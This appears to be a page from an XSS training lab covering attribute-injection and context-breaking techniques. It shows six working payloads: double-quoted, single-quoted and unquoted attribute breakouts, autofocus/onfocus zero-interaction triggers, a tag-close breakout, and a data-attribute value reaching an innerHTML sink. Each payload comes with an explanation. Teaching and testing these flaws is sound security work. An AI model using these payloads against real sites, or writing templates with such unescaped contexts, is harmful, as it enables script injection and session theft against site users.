Attack 05 — Attribute Injection & Context Breaking

Breaking out of attribute values to inject event handlers or new tags. Covers double-quoted, single-quoted, unquoted, and data attributes.

1
Double-quoted breakout — add event handler
Executes on hover

The template is value="{q}". Injecting a double-quote closes the attribute. Everything after becomes new tag content — we add a new attribute (onmouseover), then open a dummy attribute (x=") to absorb the trailing quote from the template.

value="
" onmouseover="alert(document.domain)" x="
" ← original closing quote absorbed into x= value
Result in DOM: value="" onmouseover="alert(document.domain)" x=""
Fire on server

On the destination page, hover over the input field to trigger.

2
Double-quoted breakout — zero interaction (autofocus)
ZERO INTERACTION

Adding autofocus to the injected payload causes the browser to focus the element immediately on page load — firing onfocus with no user action.

" autofocus onfocus="alert(document.domain)" x="
Result: value="" autofocus onfocus="alert(document.domain)" x=""
Fire (zero interaction)
3
Double-quoted breakout — close tag, inject new element
ZERO INTERACTION

A more aggressive breakout: close the attribute AND the tag entirely with ">, then inject a new element with its own event handler, then repair the remaining template HTML with <input x=".

">Result: value="">
Fire tag-close breakout
4
Single-quoted attribute breakout
Different delimiter

A partial fix that escapes " but leaves ' unescaped is still vulnerable when the template uses single-quote delimiters. The break-out character changes but the technique is identical.

value='
' onmouseover='alert(document.domain)' x='
' ← closing quote absorbed
Fire single-quote breakout
Click "Demo" to see the partial-fix scenario in the DOM.
5
Unquoted attribute — whitespace terminates
No quote character needed

An unquoted attribute value ends at the first whitespace character. No quote injection required — a space in the payload is enough to terminate the value and begin a new attribute name.

value=
x onmouseover=alert(document.domain)
← space after 'x' ends value, starts new attribute
Result: value=x onmouseover=alert(document.domain)
Fire unquoted breakout

Hover the input on the destination page.

6
data-* attribute → DOM XSS sink
DOM XSS ZERO INTERACTION

The server correctly places user input in a data-query attribute — which is not rendered into the visible HTML body, so no tag injection occurs server-side. However, the page's JavaScript reads dataset.query and assigns it to innerHTML — a DOM XSS sink. The event handler payload in the injected HTML fires immediately via onerror.

/attr-data?q=<img src=x onerror=alert('DOM XSS via data attribute sink')>
Fire DOM XSS via data attr

Note: the server-side HTML is not vulnerable — the injection happens client-side when JS assigns dataset.query to innerHTML.
